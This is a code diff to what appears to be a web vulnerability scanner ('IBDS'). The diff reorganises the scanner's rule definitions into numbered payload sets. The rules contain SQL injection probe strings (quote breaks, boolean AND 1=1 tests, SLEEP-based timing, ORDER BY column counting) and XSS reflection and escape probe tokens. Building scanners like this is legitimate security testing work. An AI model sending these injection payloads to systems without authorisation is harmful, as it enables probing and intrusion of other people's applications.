@@ -12,27 +12,47 @@ class AttackRule:
     vuln_type: str
     technique: str
     sequence: list[str]
-    payload_templates: dict[str, list[str]]
+    baseline_template: str
+    payload_sets: list[dict[str, str]]
     evidence_required: list[str]
     target_hint: dict[str, Any] = field(default_factory=dict)
+    baseline_policy: dict[str, Any] = field(
+        default_factory=lambda: {
+            "mode": "reuse_per_target",
+            "refresh_interval_seconds": 30,
+        }
+    )
 
 
 def _sqli_error_rule() -> AttackRule:
     return AttackRule(
-        attack_id="AR-SQLI-ERR-001",
+        attack_id="AR-SQLI-ERR",
         vuln_type="sqli",
         technique="error",
         sequence=["baseline", "error_attack"],
-        payload_templates={
-            "baseline": ["{value}"],
-            "error_attack": [
-                "{value}'",
-                '{value}"',
-                "{value}'--",
-                "{value}')",
-                "{value}\"",
-            ],
-        },
+        baseline_template="{value}",
+        payload_sets=[
+            {
+                "set_id": "AR-SQLI-ERR-001",
+                "error_attack": "{value}'",
+            },
+            {
+                "set_id": "AR-SQLI-ERR-002",
+                "error_attack": '{value}"',
+            },
+            {
+                "set_id": "AR-SQLI-ERR-003",
+                "error_attack": "{value}'-- ",
+            },
+            {
+                "set_id": "AR-SQLI-ERR-004",
+                "error_attack": '{value}"-- ',
+            },
+            {
+                "set_id": "AR-SQLI-ERR-005",
+                "error_attack": "{value}')",
+            },
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -47,23 +67,28 @@ def _sqli_error_rule() -> AttackRule:
 
 def _sqli_boolean_rule() -> AttackRule:
     return AttackRule(
-        attack_id="AR-SQLI-BOOL-001",
+        attack_id="AR-SQLI-BOOL",
         vuln_type="sqli",
         technique="boolean",
         sequence=["baseline", "boolean_true", "boolean_false"],
-        payload_templates={
-            "baseline": ["{value}"],
-            "boolean_true": [
-                "{value}' AND '1'='1",
-                "{value}\" AND \"1\"=\"1",
-                "{value} AND 1=1",
-            ],
-            "boolean_false": [
-                "{value}' AND '1'='2",
-                "{value}\" AND \"1\"=\"2",
-                "{value} AND 1=2",
-            ],
-        },
+        baseline_template="{value}",
+        payload_sets=[
+            {
+                "set_id": "AR-SQLI-BOOL-001",
+                "boolean_true": "{value}' AND '1'='1",
+                "boolean_false": "{value}' AND '1'='2",
+            },
+            {
+                "set_id": "AR-SQLI-BOOL-002",
+                "boolean_true": '{value}" AND "1"="1',
+                "boolean_false": '{value}" AND "1"="2',
+            },
+            {
+                "set_id": "AR-SQLI-BOOL-003",
+                "boolean_true": "{value} AND 1=1",
+                "boolean_false": "{value} AND 1=2",
+            },
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -79,28 +104,31 @@ def _sqli_boolean_rule() -> AttackRule:
 
 def _sqli_time_rule(delay_seconds: int) -> AttackRule:
     return AttackRule(
-        attack_id="AR-SQLI-TIME-001",
+        attack_id="AR-SQLI-TIME",
         vuln_type="sqli",
         technique="time",
         sequence=["baseline", "time_control", "time_delay", "time_retry"],
-        payload_templates={
-            "baseline": ["{value}"],
-            "time_control": [
-                "{value}' AND SLEEP(0)-- ",
-                "{value}\" AND SLEEP(0)-- ",
-                "{value} AND SLEEP(0)",
-            ],
-            "time_delay": [
-                f"{{value}}' AND SLEEP({delay_seconds})-- ",
-                f"{{value}}\" AND SLEEP({delay_seconds})-- ",
-                f"{{value}} AND SLEEP({delay_seconds})",
-            ],
-            "time_retry": [
-                f"{{value}}' AND SLEEP({delay_seconds})-- ",
-                f"{{value}}\" AND SLEEP({delay_seconds})-- ",
-                f"{{value}} AND SLEEP({delay_seconds})",
-            ],
-        },
+        baseline_template="{value}",
+        payload_sets=[
+            {
+                "set_id": "AR-SQLI-TIME-001",
+                "time_control": "{value}' AND SLEEP(0)-- ",
+                "time_delay": f"{{value}}' AND SLEEP({delay_seconds})-- ",
+                "time_retry": f"{{value}}' AND SLEEP({delay_seconds})-- ",
+            },
+            {
+                "set_id": "AR-SQLI-TIME-002",
+                "time_control": '{value}" AND SLEEP(0)-- ',
+                "time_delay": f'{{value}}" AND SLEEP({delay_seconds})-- ',
+                "time_retry": f'{{value}}" AND SLEEP({delay_seconds})-- ',
+            },
+            {
+                "set_id": "AR-SQLI-TIME-003",
+                "time_control": "{value} AND SLEEP(0)",
+                "time_delay": f"{{value}} AND SLEEP({delay_seconds})",
+                "time_retry": f"{{value}} AND SLEEP({delay_seconds})",
+            },
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -113,21 +141,28 @@ def _sqli_time_rule(delay_seconds: int) -> AttackRule:
 
 
 def _sqli_order_by_rule(max_order_by: int) -> AttackRule:
-    payload_templates = {"baseline": ["{value}"]}
+    sequence = ["baseline"] + [f"order_by_{index}" for index in range(1, max_order_by + 1)]
+
+    single_quote_set = {"set_id": "AR-SQLI-ORDER-001"}
+    double_quote_set = {"set_id": "AR-SQLI-ORDER-002"}
+    numeric_set = {"set_id": "AR-SQLI-ORDER-003"}
 
     for index in range(1, max_order_by + 1):
-        payload_templates[f"order_by_{index}"] = [
-            f"{{value}}' ORDER BY {index}-- ",
-            f"{{value}}\" ORDER BY {index}-- ",
-            f"{{value}} ORDER BY {index}",
-        ]
+        single_quote_set[f"order_by_{index}"] = f"{{value}}' ORDER BY {index}-- "
+        double_quote_set[f"order_by_{index}"] = f'{{value}}" ORDER BY {index}-- '
+        numeric_set[f"order_by_{index}"] = f"{{value}} ORDER BY {index}"
 
     return AttackRule(
-        attack_id="AR-SQLI-ORDER-001",
+        attack_id="AR-SQLI-ORDER",
         vuln_type="sqli",
         technique="order_by",
-        sequence=["baseline"] + [f"order_by_{index}" for index in range(1, max_order_by + 1)],
-        payload_templates=payload_templates,
+        sequence=sequence,
+        baseline_template="{value}",
+        payload_sets=[
+            single_quote_set,
+            double_quote_set,
+            numeric_set,
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -146,14 +181,17 @@ def _sqli_order_by_rule(max_order_by: int) -> AttackRule:
 
 def _xss_reflection_rule() -> AttackRule:
     return AttackRule(
-        attack_id="AR-XSS-REFLECT-001",
+        attack_id="AR-XSS-REFLECT",
         vuln_type="xss",
         technique="reflection",
         sequence=["baseline", "random_token"],
-        payload_templates={
-            "baseline": ["{value}"],
-            "random_token": ["IBDS_REFLECT_{token}"],
-        },
+        baseline_template="{value}",
+        payload_sets=[
+            {
+                "set_id": "AR-XSS-REFLECT-001",
+                "random_token": "IBDS_REFLECT_{token}",
+            },
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -167,14 +205,17 @@ def _xss_reflection_rule() -> AttackRule:
 
 def _xss_escape_rule() -> AttackRule:
     return AttackRule(
-        attack_id="AR-XSS-ESCAPE-001",
+        attack_id="AR-XSS-ESCAPE",
         vuln_type="xss",
         technique="escape",
         sequence=["baseline", "special_chars_token"],
-        payload_templates={
-            "baseline": ["{value}"],
-            "special_chars_token": ['IBDS_ESC_{token}<>"\'&'],
-        },
+        baseline_template="{value}",
+        payload_sets=[
+            {
+                "set_id": "AR-XSS-ESCAPE-001",
+                "special_chars_token": "IBDS_ESC_{token}<>\"'&",
+            },
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -189,14 +230,17 @@ def _xss_escape_rule() -> AttackRule:
 
 def _xss_context_rule() -> AttackRule:
     return AttackRule(
-        attack_id="AR-XSS-CONTEXT-001",
+        attack_id="AR-XSS-CONTEXT",
         vuln_type="xss",
         technique="context",
         sequence=["baseline", "context_token"],
-        payload_templates={
-            "baseline": ["{value}"],
-            "context_token": ["IBDS_CTX_{token}"],
-        },
+        baseline_template="{value}",
+        payload_sets=[
+            {
+                "set_id": "AR-XSS-CONTEXT-001",
+                "context_token": "IBDS_CTX_{token}",
+            },
+        ],
         evidence_required=[
             "status_code",
             "body_length",
@@ -243,10 +287,10 @@ def build_attack_request_list(
         )
 
     return {
-        "version": "1.0",
+        "version": "1.1",
         "description": (
             "Attack request list for IBDS. This file defines request groups only. "
-            "It must not decide vulnerabilities or send HTTP requests."
+            "It must not mutate requests, send HTTP traffic, or decide findings."
         ),
         "rules": [asdict(rule) for rule in rules],
     }
